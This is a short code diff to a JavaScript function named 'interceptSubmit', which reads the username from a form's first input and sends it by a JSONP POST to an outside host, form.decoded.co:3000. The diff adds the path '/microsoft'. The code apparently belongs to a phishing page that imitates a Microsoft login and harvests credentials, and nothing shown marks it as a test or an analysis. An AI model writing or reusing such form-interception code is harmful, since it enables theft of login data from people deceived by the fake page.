@@ -9,7 +9,7 @@ function interceptSubmit() {
 
         var username = $('input:first').val();
            $.ajax({
-                url: 'http://form.decoded.co:3000',
+                url: 'http://form.decoded.co:3000/microsoft',
                 data: {username: username},
                 method: 'POST',
                 dataType: 'jsonp',
